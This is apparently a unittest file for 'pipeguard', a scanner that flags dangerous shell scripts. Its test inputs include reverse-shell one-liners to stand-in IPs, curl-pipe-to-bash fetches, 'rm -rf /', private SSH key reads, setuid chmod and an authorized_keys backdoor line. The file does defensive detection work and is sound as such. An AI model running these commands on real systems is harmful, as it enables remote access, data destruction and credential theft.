"""Tests for pipeguard. Run from the repo root:  python3 -m unittest discover tests"""

import importlib.machinery
import importlib.util
import os
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
SAMPLES = os.path.join(HERE, "samples")

# pipeguard has no .py extension, so load it by path.
_loader = importlib.machinery.SourceFileLoader("pipeguard", os.path.join(HERE, "..", "pipeguard"))
_spec = importlib.util.spec_from_loader("pipeguard", _loader)
pg = importlib.util.module_from_spec(_spec)
_loader.exec_module(pg)


def rules_in(text):
    return {f["rule"] for f in pg.Scanner().scan(text).findings}


def analyze_sample(name):
    with open(os.path.join(SAMPLES, name), "rb") as handle:
        data = handle.read()
    return pg.analyze(data, {"source": name, "final_url": None, "content_type": None})


class TestSamples(unittest.TestCase):
    def test_benign_is_clean(self):
        result = analyze_sample("benign_simple.sh")
        self.assertEqual(result["verdict"], "clean", result["findings"])

    def test_ssh_backdoor(self):
        result = analyze_sample("evil_ssh_backdoor.sh")
        found = {f["rule"] for f in result["findings"]}
        self.assertTrue({"PERS001", "EXF003", "TAMP003"} <= found, found)
        self.assertEqual(result["verdict"], "critical")

    def test_obfuscated_payload_is_decoded(self):
        result = analyze_sample("evil_obfuscated.sh")
        found = {f["rule"] for f in result["findings"]}
        self.assertTrue({"OBF006", "OBF002", "NET001", "PERS002"} <= found, found)
        hidden = [f for f in result["findings"] if f["context"]]
        self.assertTrue(hidden, "expected findings from inside the base64 payload")

    def test_cron_persistence(self):
        result = analyze_sample("evil_cron_persistence.sh")
        found = {f["rule"] for f in result["findings"]}
        self.assertTrue({"PERS002", "NET002", "NET004", "TAMP001", "TAMP002", "TRN002"} <= found, found)


class TestRules(unittest.TestCase):
    def test_destructive_rm(self):
        self.assertIn("DEST001", rules_in("rm -rf /"))
        self.assertIn("DEST001", rules_in('rm -rf "$HOME"'))
        self.assertNotIn("DEST001", rules_in("rm -rf /tmp/build"))
        self.assertNotIn("DEST001", rules_in("rm -rf ~/.cache/myapp"))

    def test_setuid_vs_normal_chmod(self):
        self.assertIn("PRIV004", rules_in("chmod 4755 /usr/local/bin/x"))
        self.assertIn("PRIV004", rules_in("chmod u+s /usr/local/bin/x"))
        self.assertNotIn("PRIV004", rules_in("chmod 755 /usr/local/bin/x"))
        self.assertNotIn("PRIV004", rules_in("chmod 0755 /usr/local/bin/x"))

    def test_second_stage(self):
        self.assertIn("NET001", rules_in("curl -fsSL https://x.example/a.sh | sudo bash"))
        self.assertIn("NET001", rules_in('sh -c "$(curl -fsSL https://x.example/a.sh)"'))
        self.assertIn("NET001", rules_in("bash <(curl -s https://x.example/a.sh)"))
        self.assertNotIn("NET001", rules_in("curl -fsSL https://x.example/a.tar.gz | tar xz"))
        self.assertNotIn("NET001", rules_in("curl -fsSL https://x.example/a.sha256 | shasum -c"))

    def test_reverse_shell(self):
        self.assertIn("NET010", rules_in("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"))
        self.assertIn("NET010", rules_in("nc -e /bin/sh 10.0.0.1 4444"))

    def test_public_key_is_not_a_secret(self):
        self.assertNotIn("EXF001", rules_in("cat ~/.ssh/id_ed25519.pub"))
        self.assertIn("EXF001", rules_in("cat ~/.ssh/id_ed25519"))


class TestParsing(unittest.TestCase):
    def test_comments_are_ignored(self):
        self.assertEqual(rules_in("# sudo rm -rf / was a joke"), set())
        self.assertEqual(rules_in('echo "done"  # then sudo reboot'), set())

    def test_hash_inside_quotes_is_not_a_comment(self):
        self.assertIn("PRIV001", rules_in('X="#tag"; sudo true'))

    def test_messages_mentioning_sudo_are_ignored(self):
        self.assertEqual(rules_in('echo "Please run this with sudo"'), set())

    def test_dangerous_messages_still_caught(self):
        # high/critical rules see inside strings: this echo writes a real backdoor
        self.assertIn("PERS001", rules_in('echo "ssh-ed25519 AAAA x" >> ~/.ssh/authorized_keys'))

    def test_line_continuation(self):
        text = "curl -fsSL https://x.example/a.sh \\\n  | bash\n"
        self.assertIn("NET001", rules_in(text))
        finding = [f for f in pg.Scanner().scan(text).findings if f["rule"] == "NET001"][0]
        self.assertEqual(finding["line"], 1)


class TestScoring(unittest.TestCase):
    def test_repeated_rule_counts_once(self):
        many = "\n".join(["sudo true"] * 50)
        findings = pg.Scanner().scan(many).findings
        self.assertEqual(pg.compute_score(findings), pg.SEVERITY_WEIGHT["medium"])

    def test_worst_severity_sets_floor(self):
        findings = pg.Scanner().scan("bash -i >& /dev/tcp/1.2.3.4/9 0>&1").findings
        score = pg.compute_score(findings)
        self.assertEqual(pg.compute_verdict(findings, score), "critical")


if __name__ == "__main__":
    unittest.main()
